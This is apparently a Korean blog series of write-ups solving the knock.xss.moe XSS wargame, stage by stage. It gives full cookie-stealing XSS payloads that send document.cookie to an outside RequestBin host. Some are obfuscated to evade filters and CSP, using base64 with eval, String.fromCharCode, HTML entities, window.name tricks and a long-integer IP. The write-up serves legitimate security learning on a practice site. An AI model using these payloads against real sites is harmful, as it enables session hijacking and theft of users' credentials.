수천번의 노크라고 진짜 xss 스크립트 수천번 때리게 되는 wargame 사이트입니다! 하하



------



### 2-1. prolog



knock.xss.moe는 xss-game이랑 플래그 얻는 방식이 달라서 제가 시간을 쪼오금 투자했었는데, 님들은 투자하지 마시라고 섬세한 설명으로 모시겠습니다.

xss game는 alert 창을 띄우는 방식이었다면, knock.xss.moe는 서버의 주소를 URL 창에 넣어서 보내서 **내 서버에서 flag를 확인하는 방식**입니다.


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_21.png)

```
http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?location=%22"여기에 내 서버 주소를 넣으면 됩니다!!"/?%22%2Bdocument.cookie
```



근데 여러분 서버를 가지고 있지 않거나 세팅하기 귀찮은 분도 계실거라고 생각해서 좋은 사이트 하나 알려드릴게요.

> [Requestbin](http://requestbin.fullcontact.com/)


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_02.png)

위의 `Create a RequestBin`을 클릭하면 생성이 되는데 밑의 네모 칸이 주소입니다.
그 URL을 가지고 서버 주소 자리에 넣으면 아래와 같이 `flag`를 확인할 수 있죠!


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_03.png)

문제 푸는 방법을 알았어요! 그럼 이제 문제를 풀어보죠!!



------



### 2-2. Stage 2 - url encoding



2번에서는 제가 URL 인코딩을 알게 된 문제입니다!

2번 문제는 아래와 같이 get 방식으로 구현이 되어있어 q 뒤의 내용이 출력되는 기능을 가지고 있는 웹페이지입니다.


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_04.png)

그래서 q 뒤에 document.cookie가 포함된 스크립트를 보내보았습니다!


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_05.png)

하지만 `failed csrf check!`라고 뜨면서 실패가 뜬다…ㅠ

고민을 해보다 `+`를 url encoding하면 나오는 `%2B`를 넣어서 보내보았더니 성공이다!

오잉? **URL enconding이란?**

URL은 ASCII 문자 집합을 사용하여 인터넷을 통해서만 전송할 수 있게 만들어졌습니다.
그래서 외부의 문자를 포함할 때, ASCII 형식으로 변한이 되어야지 입력이 됩니다.

**URL encoding은 외부 문자가 ASCII 형식으로 변환되는 것을 의미해요.**


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_06.png)

근데 URL encoding이 왜 사용이 되는가..?
2가지때문에 사용이 된다고 합니다!

1. URL encoding이 사용되는 이유는 앞서 설명했듯이 URL이 ASCII로 구성되어있어서 정의되지 않은 문자열은 URL에 포함될 수 없기 때문이죠!
2. URL 내에서 의미를 가진 문자(%,?,#)나 url에는 공백이 있을 수 없기 때문에 %20으로 변환한다든지 system에서 해석이 될 수 있는 문자(<.>)를 치환하여 야기 될 수 있는 문제점을 예방할 수 있습니다.

> [url에서 문제가 될 수 있는 문자들](https://bluestarblogkr.blogspot.com/2011/10/url-encoding.html)



------



### 2-3. Stage 4 - close tag



```
<a href='/q=XSS'>Link</a>
```

위는 stage 4의 페이지소스입니다.

실행되어야 하는 스크립트 위치가 태그 안이라서 실행이 되지 않습니다. 이러한 경우는 태그 밖으로 스크립트 위치를 빼줘야겠죠!


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_07.png)

그럼 이렇게 해결을 할 수 있습니다. `<a>,<textarea>,<xmp>` 등등도 태그를 끝내고 스크립트를 추가해주면 됩니다.



------



### 2-4. Stage 7 - input focus



```
<input type="text" value="XSS">
```

페이지 소스를 보면 저렇게 되어있다. input 안에 q=‘내용’이 들어가게 됩니다.

그 전에처럼 아래와 같이 넣으면,

```
?q="><script>location.href='https://requestb.in/13kpne51?'%2Bdocument.cookie</script>
<input type="text" value=""&gt;&lt;script&gt;location.href=&#39;https://requestb.in/13kpne51?&#39;+document.cookie&lt;/script&gt;">
```

이렇게 됨을 확인할 수 있습니다. 그래서 &gt와 같이 html Entity로 변경되어서 이스케이프 되는 것을 확인할 수 있습니다..

> [w3schools html entity](https://www.w3schools.com/charsets/ref_html_entities_4.asp)

그래서 기존과 같은 공격을 못 하게 되어있습니다.

그래서 <,>가 필요 없는 autofocus를 사용했습니다.


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_08.png)

위에처럼 넣으면 input 타입 안에 autofocus로 들어가게 되는 거잖아요? 그럼 페이지가 로드될 때 자동의 저 안으로 포커스를 맞추게 하는 속성입니다. 그래서 그 안에 스크립트를 넣으면 성공하게 됩니다!



------



### 2-5. Stage 10 - not script



```
<frameset><frame src="XSS"></frameset>
```

페이지 소스는 위와 같아요!

이번에도 <,>를 사용하지 못하고, 심지어 input 창도 없다.. 이러한 경우에


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_09.png)

이렇게 javascript:location.herf로 하면 js인걸로 판단하고 location.href를 실행하게 된다. 그래서 `<script>` 없이 실행을 성공!



------



### 2-6. Stage 12 - CSP



12번 문제 정말 제가 고생 많이 했던 거고 csp에 대해서 공부를 한 문제입니다.

csp가 적용되어있어서 이를 우회해야지 문제를 풀 수 있었습니다.

우선 문제를 볼까요!

```
<iframe src="XSS"></iframe>
```

이렇게 되어있는데..노크를 진짜 많이 해봤는데 안 되는 거에요…

잠시 제 뻘짓을 보실래요?

```
<iframe src="XSS"></iframe>
javascript:location.href=%27http://requestbin.fullcontact.com/15j27ri1?a=%27%2Bdocument.cookie%20
```

위는 11번 문제의 풀이다. 그래서 위의 소스를 그대로 넣었더니 이렇게 이미지 없음이 뜬다.
![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_20.png)

이미지라고 하니까 xss game의 2번문제 `<img src =" " onerror="">`로 푼 문제가 생각나서 onerror를 넣어보았다.

```
?q=qwe%22%20onerror=%22javascript:location.href=%27http://requestbin.fullcontact.com/15j27ri1?a=%27%2Bdocument.cookie
```

이렇게 넣으니까 안된다!! 왜 안되냐!!! 왜!!!!!

근데 `head`에 `csp`가 걸려있어서 그걸 우회해야 하는 문제더라고요.

csp가 무엇이냐고여? content security policy의 약자인데요.
브라우저에 XSS와 관련된 공격을 막아주는 헤더에요.
**브라우저는 기본적으로 페이지에서 요청하는 모든 코드를 다운로드하여 실행하는데, csp를 설정함으로써 브라우저에 어떠한 조건의 리소스만 실행하거나 렌더링하라고 지시를 내릴 수 있게 되는거죠!!!**

그래서 이걸 듣고 눈으로 보고 싶어서 브라우저상에서 열심히 찾았죠!


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_11.png)

근데 여기서 못찾는거더라고요…

두가지 방법이 있는데요.

```
root@ubuntu:/var/www/html# curl -v http://a4f51941335441be0fdb21c2890ec17b1d0f08f0.knock.xss.moe/?q=XSS
*   Trying 133.130.88.37...
* Connected to a4f51941335441be0fdb21c2890ec17b1d0f08f0.knock.xss.moe (133.130.88.37) port 80 (#0)
> GET /?q=XSS HTTP/1.1
> Host: a4f51941335441be0fdb21c2890ec17b1d0f08f0.knock.xss.moe
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx
< Date: Mon, 23 Jul 2018 12:54:26 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-XSS-Protection: 0
< Content-Security-Policy: script-src 'self' 'unsafe-inline'; frame-src 'self'
< 
* Connection #0 to host a4f51941335441be0fdb21c2890ec17b1d0f08f0.knock.xss.moe left intact
<iframe src="XSS"></iframe>
```

이렇게 `curl -v`로 확인하는 방법이랑

[csp evaluator](https://csp-evaluator.withgoogle.com/)사이트에서 검색하면 어떤 csp가 걸려있는지 확인할 수 있습니다.


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_10.png)

이렇게 csp가 걸려있음을 확인할 수 있습니다.

```
?q=javascript:parent.document.getElementsByTagName("head")[0].innerHTML=`<img%20src=x%20onerror=%27location.href="http://requestbin.fullcontact.com/15j27ri1?a=".concat(document.cookie)%27>`
```

`head` 태그에 이미지를 추가해서 이미지 추가해서 그걸 로드하는 방식으로 이루어지게 되는데 `iframe` 안에 `parent`가 `iframe`을 불러온 부모프레임에 접근을 하는 것을 말한다.

그래서 `tag` 이름이 `head`인 것을 찾아내서 `innerHTML`에 `img` 태그 일부러 오류내서 `src='x' onerror` 핸들러에 XSS를 집어넣어서 성공시키면 된다. 우와! 대박



------


그럼 오늘은 여기서 안뇽!

### to be continue…



---

# XSS 3일차

### 이전편 요약

```
똑똑똑 여기 누가 있나요? 
XSS Wargame 문제를 풀면서 XSS에 대해서 알아가고 있는중입니다!
```


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_40.png)



안녕하세요… 스크립트 여러번 때리면서 현타온 yeali입니다.

지금 **stage 21**까지 풀었어요! 여러분들은 어디까지 푸셨나요?


![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_17.png)

------



### XSS 여행 3일차 계획

> - #### 1. 동네 탐방(수천번의 노크 XSS)
>
>   - **stage 13 - Dom XSS**
>
>   - **stage 14 - Cross Domain**
>
>     



------



### 1. Stage 13 - Dom XSS


![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_07.png)



```html
<form action="">
    <input type="text" value="XSS" name="q" id="q">
    <input type="submit">
</form>
<div id="echo-back"></div>
<script>
    let $ = (id) => {
        return document.getElementById(id)
    }
    $('echo-back').innerHTML = $('q').value;
</script>
<br>
```



우선 2편에서 보았던 문제들과 다르게 소스가 많이 보이는군요!



```html
<script>
    let $ = (id) => {
        return document.getElementById(id)
    }
    $('echo-back').innerHTML = $('q').value;
</script>
```



우선 **document.getElementById** 이 놈은 뭐하는 놈일까…?



w3cschool에 좋은 예제가 있어서 같이 보고자 합니다!



> **[w3cschool - document.getElementById](https://www.w3schools.com/jsref/met_document_getelementbyid.asp)**



```html
<!DOCTYPE html>
<html>
<body>

<p id="demo">Click the button to change the text in this paragraph.</p>

<button onclick="myFunction()">Try it</button>

<script>
function myFunction() {
    document.getElementById("demo").innerHTML = "Hello World";
}
</script>

</body>
</html>
```



위의 코드가 반영된 내용은 아래와 같이 나온다!


![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_01.png)



try it을 누르면 hello world가 출력되는 코드입니다.


![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_02.png)



getElementById는 문서의 내용을 바꾸거나 정보를 얻어야 할 때 사용되는데 HTML DOM에서 가장 일반적인 방법라고 합니다.

w3c의 예제를 보면 아래와 같은 의미가 담겨져있다고 해석했습니다.
`getElementById('demo')는 아이디가 demo인 HTML요소를 갖고 와라. button을 클릭하면 innerHTML 안에 있는 내용으로 바꿔줄게!`



**그럼 다시 문제로 돌아가볼까요?**



```html
<form action="">
    <input type="text" value="XSS" name="q" id="q">
    <input type="submit">
</form>
<div id="echo-back"></div>
<script>
    let $ = (id) => {
        return document.getElementById(id)
    }
    $('echo-back').innerHTML = $('q').value;
</script>
```



우선 알림창을 띄워볼건데 어떻게 띄울 수 있을까요?



```html
<form action>  
    <input type="text" value="XSS" name="q" id="q">
    <input type="submit">
</form>
  <div id = "echo-back">
    ""> "
    <script> alert (1) </script>
  </div>
```



위와 같이 하면 알림창이 뜰거라고 생각하고, 아래와 같이 스크립트를 넣어주었습니다.



```html
"> <script> alert(1) </script> <input + value ="
```



![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_03.png)



근데 안되요…ㅠㅠ



우선 문제를 풀기위해 삽질을 시작한다!…

삽질 100번하니 1개의 돌을 찾았어요!



```html
<input type="">
```


![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_04.png)



이렇게 input type창이 생성됩니다.

여기서 드는 생각!
**내가 넣은 input창을 공격해서 쿠키를 가져올 순 없을까?**

그래서 이렇게 해보았습니다.



```html
<input autofocus onfocus=alert(1)>
```


![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_08.png)



와 이렇게 하면 알림창 떠요! 끝났다 끝났어!
*(어? 근데 확인을 눌러도 계속 알림창이 떠요?)*

두구두구 기대하시라!



```html
<input type="" name="1" onfocus=location.href="server link"+document.cookie autofocus>
```



ㅎ..안되네요!ㅎ..

도대체 어떻게 푸는거냐구요ㅠㅠㅠㅠ



------

![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_05.png)사람이 생각하기 싫으면 하는 일.jpg



------



이러고 있을때 **ccoma**언니가 와서 필터링부터 확인하는법을 알려줌!
**알고보니 `document.cookie`가 필터링되고 있더라고요!**

이거 필터링되면 try harder가 뜸! 그래서 안되었던거였어요!

그럼 `document.cookie`를 우회하면 풀릴겁니다!



**내 계획을 들어봐요!**

```html
<input autofocus onfocus=eval(atob( 여기 안에 base64로 변환한 내용을 넣을거에요! )))>
```



변환될 내용은 아래와 같을 예정이에요!

```
'location='server address?a='+document.cookie'
```



변환을 하면?!

```
bG9jYXRpb249J2h0dHA6Ly9yZXF1ZXN0YmluLmZ1bGxjb250YWN0LmNvbS9zeDA4MjBzeD9hPScrZG9jdW1lbnQuY29va2llJw==
```



**짜란! 풀립니다!**



![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_09.png)13번이 남긴 스크립트.jpg





------



진짜 사소한 이유로 못 풀고 있었던 문제… 넘나 힘든 문제였습니다…

**근데 잠시만요! 이거 Dom XSS문제에요.**
Dom XSS가 뭔지 우리 1편에서 잠깐 봤는데, 예시 문제가 없었거든요!


![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_10.png)



지금 예시 문제를 만난 김에 알아가고 넘어가죠!



#### Dom이 뭔가요??

![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_11.png)



프로그램 및 스크립트가 문서의 컨텐츠, 구조, 및 형식을 동적으로 접근 및 업데이트할 수 있도록 하는 언어 중립적인 인터페이스라고 합니다!



> **w3c - Document Object Model**



아까 문제 풀기 전에 `getElementById`는 문서의 내용을 바꾸거나 정보를 얻어야 할 때 사용되는데 `HTML DOM`에서 가장 일반적인 방법라고 했었어요!

그래서 아래와 같이 생각할 수 있었던거에요!!



#### 회상

```html
<form action>  
    <input type="text" value="XSS" name="q" id="q">
    <input type="submit">
</form>
  <div id = "echo-back">
    ""> "
    <script> alert (1) </script>
  </div>
```



이렇게 되면 알림창이 뜰거라고 생각하고, 아래와 같이 스크립트를 넣어주었어요!

```
"> <script> alert(1) </script> <input + value ="
```



피해자의 브라우저가 **HTML page를 구문 분석**할 때마다, 공격 스크립트가 **DOM 생성의 일부로 실행**되면서 공격하게 됩니다.
그래서 HTML page가 변하지 않지만, 페이지에 포함되어있는 브라우저 측 코드가 DOM 환경에 영향을 주게 되죠!

그래서 아까 `어라? 한번이 아니라 계속 알림창이 실행되네?` 라고 했던것도 브라우저 측 코드가 Dom 환경에 영향을 주어서 store XSS같은 역할을 할 수 있게 된겁니다.



------



### 2. Stage 14 - Cross domain


![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_13.png)



```html
<iframe src="javascript:alert(1)"></iframe>
<script>document.domain="knock.xss.moe"</script>
```



stage 14, 개인적으로 어려웠어요.
여러분들도 고생해서 깨달음을 얻었으면 좋겠어서 여기서 마무리할게요!

다음주까지 풀어오세요^^ `Bye!`



------



이러고 싶었지만…허헣 진행하겠습니다.

이번 문제는 `doument.domain iframe`이라고 구글에 치면 관련검색어로도 뜨는!


![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_14.png)



나만 모르고 있던 그런 이슈였던거같더라고요..



> **[cross domain - document.domain](https://webisfree.com/2015-01-08/[자바스크립트]-크로스도메인-서브도메인-접근방법-document-domain)**



이걸 보면 Dom에 **크로스도메인**을 설정해서 알림창을 띄우면 될거같다고 예상했습니다.
근데 어떻게 해야 되냐고여! (탕탕!!)
q 뒤에 도메인을 넣어야 되는거같은데 14번 문제 도메인 넣어도 안되서 고민해보다가 12번 문제가 생각났습니다.

**CSP 때문에 고생 꽤나 했던 12번 기억나십니까?**


![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_15.png)



똑같이 생겼죠? 그래서 12번 문제를 q 뒤에 넣고 알림창을 띄우는 스크립트를 넣어보면!!



```
http://3cb34c8407410e2d6c1d708b786ce69a0192b470.knock.xss.moe/?q=http://a4f51941335441be0fdb21c2890ec17b1d0f08f0.knock.xss.moe/?q=javascript:alert(1)
```


![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_16.png)



ㅎㅎㅎ알림창 떴다. 절반 풀었다.
**이제 `document.cookie`를 넣어서 날려보려고 하지만, 이번에도 필터링되어있지롱!**

**그래서 13번과 같이 하려고 했으나 이 놈의 `CSP`!!!!**

편집장님 저 여기다가 험한 말하면 안되죠?ㅠㅠ

*응 안돼*



------



제 삽질의 결론은요!



```
http://3cb34c8407410e2d6c1d708b786ce69a0192b470.knock.xss.moe/?q=http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?document.domain=%22knock.xss.moe%22;eval(String.fromCharCode(119,105,110,100,111,119,46,111,112,101,110,40,34,104,116,116,112,58,47,47,114,101,113,117,101,115,116,98,105,110,46,102,117,108,108,99,111,110,116,97,99,116,46,99,111,109,47,49,108,104,51,97,97,51,49,63,97,61,34,43,112,97,114,101,110,116,46,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))
```



이겁니다! 이거라고요! 허허!

아스키코드의 내용은,

```
window.open("server address?a="+parent.document.cookie)
```



`document.cookie`는 아스키코드로 우회했고요!
`parent.document.cookie`를 사용하니 쿠키 전달되더라고요!

```
This is a dummy page for tutorial.
So this page is already pwned and has XSS payload on itself.
Click this with Google Chrome.
```



이렇게 창이 뜨고 `Click`를 누르면 `ok`가 뜹니다!!

![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_12.png)14번이 남긴 스크립트.jpg



------



#### 오늘은 마지막 인사보다 오늘의 `TIP`!



> - **한번에 XSS 스크립트가 성공하겠다는건 무리데쓰! 어떤 스크립트가 먹히는지 알림창을 띄우고 시작하자.**
> - **어떤 필터링이 걸리고 CSP가 걸렸는지 확인하자.**



---

# XSS 4일차

### 이전편 요약

```
이제 손에 익어서 슬슬 지겹죠?ㅠㅠ 빨리 끝내버리죠! 

XSS 골목투어 2일 남았어요! 아자!
```


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_40.png)



우와! 드디어 slover 두자리 수에 들어왔습니다!!

뭔가 이제 골목길 들어선 느낌이네요!!

골목길에 길 잃어버려서 나 없어지면 찾지마요…


![img](https://blackperl-security.gitlab.io/img/post/2018-08-17-webtour-03/web_xss3_17.png)

------



### XSS 여행 4일차 계획

> - #### 1. 동네 탐방(수천번의 노크 XSS)
>
>   - **Stage 19 - Hello, XSS**
>   - **Stage 20 - scrscriptipt**
>   - **Stage 25 - Limit count script**
>   - **Stage26 - Change Capital letter**





------



### Stage 19 - Hello, XSS

이번 문제는 어려운건 아닌데,
이런 경우도 있었다는 걸 보여드리고 싶었어요!

들어가면 아래와 같이 알림창이 뜹니다.


![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/xss4_1.png)



```
<body onload="alert('Hello, XSS')">
```



`Hello, XSS`
코딩 공부할때, Hello, world부터 출력하고 보잖아요!
진짜 이제부터 시작인가봐요! 우리 오늘이 4일차인데 첫날인거같은 마술!



`q` 뒤에 있는 내용을 `XSS`가 있는 부분에 넣어서 알림창을 출력해주는 역할을 하고 있습니다.

그럼 우리의 알림창도 띄워볼까요..?



```
<body onload="alert('Hello, XSS')">
```



이렇게 되어있는데, alert창을 닫고, 다시 `alert(1)`를 넣으면 되지 않을까…?

해보자! 꾜!



```
?q=에레레%27);alert(%27메롱%27)//
```


![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/xss4_2.png)


![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/xss4_3.png)



쨔란 된다? 자 이제 시작이야 내꿈을~

그래서 `alert('메롱')`에 `document.cookie`를 보내는 스크립트를 넣으면 되겠지?!



```
q=XSS');location='서버주소?a='%2Bdocument.cookie//
```



이렇게 하면 Hello, XSS가 뜨고 그걸 클릭하면, `ok`가 뜹니다. 근데 막상 FLAG가 오지 않아요..

그래서 혼자 열심히 고민을 해봤는데, 이건 제 뇌피셜입니다.


![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/xss4_4.png)



여기서 url form을 보내서 flag를 받는 형식의 wargame사이트인데요.

실제 문제 사이트에서는 제가 Hello, XSS 알림창이 뜨면 `확인`을 눌러주면 서버에 정상적으로 쿠키가 보내졌는데…
그런 과정없이 한번에 가야 되는듯..음

그래서 `window.open`을 사용을 해볼까했지만, 실패!



제가 너무 돌아가보려고 했나 싶어서,
eval함수로 `location='http://requestbin.fullcontact.com/1def3da1?a='%2Bdocument.cookie`
실행하도록 하니…성공이었습니다!



------



### Stage 20 - scrscriptipt

딱 문제 페이지부터 들어가면 소스보기를 하고 이 문제에 대해서 생각을…?

해보려고 했지만, `XSS` 이게 끝!

진짜임.


![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/xss4_5.png)

그래서 기본을 시도했다!



```
<script>alert(1)</script>
```



이렇게 하니까 `alert(1)`가 뜹니다. 이걸로 `<script>`가 필터링되어서 없어짐을 알게 되었습니다.

예전에 xss game에서 이런 문제 있었는데, 그 문제에 대해서 기억나시나요?

그렇게 풀면 풀립니다!! 우와!



```
q=<scscriptript>alert(1)</scrscriptipt>
```



우힛 이렇게 하면 알림창 뜸! 그 이후에는 예상이 가죠? 그럼 pass!



------



### stage 25 - Limit count script



```
<script>alert(1)</script>
```



이렇게 하면 떠서 의아해서 밑의 스크립트를 넣으니



```
<script>location='http://requestbin.fullcontact.com/1def3da1?a='%2Bdocument.cookie</script>
```



역시 25번까지 왔는데 될리가 없죠!

그래서 왜 안되는지 소스코드 보기를 해서 보면 중간에 글자가 짤리네요!


![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/xss4_7.png)



이거 보니까 몇자 짤려요! 몇자까지 잘리나보면,



```
12345678901234567890123456789012345
```



총 35자까지 잘립니다. 35자 안에 모든 걸 끝내야 되는데, 어떻게 이 안에 넣을것인가?



이거 보니까 몇자 짤려요! 몇자까지 잘리나보면,



```
12345678901234567890123456789012345
```



총 35자까지 잘립니다. 35자 안에 모든 걸 끝내야 되는데, 어떻게 끝내야 되지?

`location='http://서버주소?'%2Bdocument.cookie` 이것만 해도 35자 넘는걸?

고민하다가 Stage 14번 기억하세요?

문자 갯수 제한 없는 비슷한 문제에 넣어서 풀면 되지! 라는 생각에 도달하게 되었어요!

그전에 우선 이 문제에서 알림창을 띄어봐야 해요!



```
<svg/onload=alert(1)>
<script>window.name="location.href='서버주소?a='%2Bdocument.cookie";
location.href="stage25번 주소/?q=%3Csvg/onload=eval(name)%3E"</script>
```



이렇게 짜고 스크립트 갯수 제한 없는 `stage2`에 스크립트 추가해서 넣었습니다!!

예~~ 풀어써 이거 풀때는 내가 이걸 왜 하고 있는가?!!!! 이 생각 뿐이었는데 푸니까 기분 좋음! `신나!`



------



### Stage26 - Change Capital letter



첫 시작은 디폴트로!



```
<script>alert(1)</script>
```



오! 역시 안되네염! 소스코드를 확인해볼까요!!


![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/xss4_8.png)



보니까 제가 치는 내용이 모두 대문자로 바뀌는것 같습니다!

js는 대소문자를 구분하기 때문에 대문자로 XSS를 할 수 있는 방법에 대해서 생각해야 됩니다…

이럴땐 커닝페이퍼를 잠시…ㅎ


![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/xss4_9.png)



> **[XSS Cheat Sheet](https://gist.github.com/sseffa/11031135)**



오! 이걸로 하면 되겠는데요? 소문자가 없어요!

```
<IMG SRC=1 onerror=location='서버주소?a='+document.cookie>
```

html entity를 활용해서 풀면 되겠다는 생각까지 왔어요!



> [HTML entity encoder/decoder](https://mothereff.in/html-entities)


![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/xss4_10.png)

```
<img src=1 onerror=&#x6C;&#x6F;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x3D;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x62;&#x69;&#x6E;&#x2E;&#x66;&#x75;&#x6C;&#x6C;&#x63;&#x6F;&#x6E;&#x74;&#x61;&#x63;&#x74;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x31;&#x63;&#x63;&#x69;&#x34;&#x78;&#x73;&#x31;&#x2F;&#x3F;&#x61;&#x3D;&#x27;&#x2B;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x63;&#x6F;&#x6F;&#x6B;&#x69;&#x65;>
```



그래서 이렇게 했는데 결과는 `fail`!

왜 안될까…ㅠㅠㅠ막 혼자 고민했는데 커널 잘하는 `puing`언니가 알려줌!

`#`이랑 `&`로 html entity로 변경해줘야 되는거였어…ㅠㅠ 대박



```
<img src=1 onerror=%26%23x6C;%26%23x6F;%26%23x63;%26%23x61;%26%23x74;%26%23x69;%26%23x6F;%26%23x6E;%26%23x3D;%26%23x27;%26%23x68;%26%23x74;%26%23x74;%26%23x70;%26%23x3A;%26%23x2F;%26%23x2F;%26%23x72;%26%23x65;%26%23x71;%26%23x75;%26%23x65;%26%23x73;%26%23x74;%26%23x62;%26%23x69;%26%23x6E;%26%23x2E;%26%23x66;%26%23x75;%26%23x6C;%26%23x6C;%26%23x63;%26%23x6F;%26%23x6E;%26%23x74;%26%23x61;%26%23x63;%26%23x74;%26%23x2E;%26%23x63;%26%23x6F;%26%23x6D;%26%23x2F;%26%23x31;%26%23x63;%26%23x63;%26%23x69;%26%23x34;%26%23x78;%26%23x73;%26%23x31;%26%23x2F;%26%23x3F;%26%23x61;%26%23x3D;%26%23x27;%26%23x2B;%26%23x64;%26%23x6F;%26%23x63;%26%23x75;%26%23x6D;%26%23x65;%26%23x6E;%26%23x74;%26%23x2E;%26%23x63;%26%23x6F;%26%23x6F;%26%23x6B;%26%23x69;%26%23x65;>
```



이렇게 또 한문제를 클리어했다!

------



#### 오늘은 여기까지!

다음편이 XSS wargame 문제 풀이 마지막입니다! 두둥!



---

# XSS 5일차

### 이전편 요약

```
마지막 문제까지 10문제도 안 남은 yeali, 오늘은 마무리를 할 수 있을것인가...?
```


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_40.png)



우선, 스포일러를 좋아하는 사람 중의 하나로써!
걱정했던 올클 다 했고요! 근데 27~34번 다 비슷한 방식으로 풀려서
정답이 없다는 것을 보여드리고 싶은 편입니다!


![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/xss5_1.png)

ㅎㅎ다 풀었어여ㅎㅎ
이거 풀면서 풀면서 1일차에 본 솔버보다 지금 차근차근 늘어가고 있던데,
문제 같이 푸는 분들 맞죠??

------



### XSS 여행 4일차 계획

> - #### 1. 동네 탐방(수천번의 노크 XSS)
>
>   - **Stage 27 - not .**
>   - **Stage 34 - html 간접표현식**
>
> - #### 2. 일기 훔쳐보기





------



## 1. 동네 탐방(수천번의 노크 XSS)

### Stage 27 - not `.`

딱 `.`만 필터링된다. 근데 생각해보면 `.`이 없으면 서버주소를 못 적고 `document.cookie`를 하는 것도 안됨.

그래서 `.`을 다른 방향으로 해야 되는 방향을 찾아야 됩니다.



**Payload 0x00**

`.`을 `dot`으로 바꿔서 진행할 수 있기 때문에, .자리에 `'dot'`을 넣고 서버는 eval함수 안에서 실행하도록 해도 됩니당.

```
q=<script>dot%20=%20String[%27fromCharCode%27](46);eval("location"%2bdot%2b"href='server addr?'%2bdocument"%2bdot%2b"cookie");</script>
```



**Payload 0x01**

이번 문제를 풀면서 알게 된게 있는데,
127.0.0.1와 같은 ip 형식을 long 형식으로 바꿔서 사용할 수가 있어요!

그러면 `.`이 필요없도록 변환이 가능하게 되더라고요!

> [ip to long site](http://www.smartconversion.com/unit_conversion/IP_Address_Converter.aspx)

`document.cookie`는 `document['cookie']`로도 가능하기 때문에 이런식으로 하면 기존과 비슷하게 xss를 성공할 수 있습니다!

```
q=%3Cscript%3Elocation[%27href%27]=%22http://757087622/?%22%2bdocument[%27cookie%27];%3C/script%3E
```



**Payload 0x02**

```
q=<svg/onload=with(location['hash']){url=slice(1);location=url%2Bdocument['cookie']}>#server addr
```



------



### Stage 34 - html 간접표현식


![img](https://blackperl-security.gitlab.io/img/post/2018-09-12-webtour-04/xss5_2.png)

```
<script&gt;alert(1)</script&gt;<input type=hidden>
```

기본적으로 xss 막을때 개발자들이 많이 사용하는 방식인 간접표현식입니다!
`>`을 간접표현식으로 표현해서 `>`로 구성되어있네요!

> [간접표현식](http://viewit.kr/169?category=379968)



**Payload 0x00**

27번이랑 다를건 없는데 이걸로 다 풀림!
`>`을 html entity로 사용해서 우회하는 방법.
지금까지 계속 사용해왔던 공격 벡터라서 쉽게 생각할 수 있었습니다!

```
q=%3Cscript%3Elocation[`href`]=`http://757087622/?`%2bdocument[`cookie`];%3C/script%3E
```



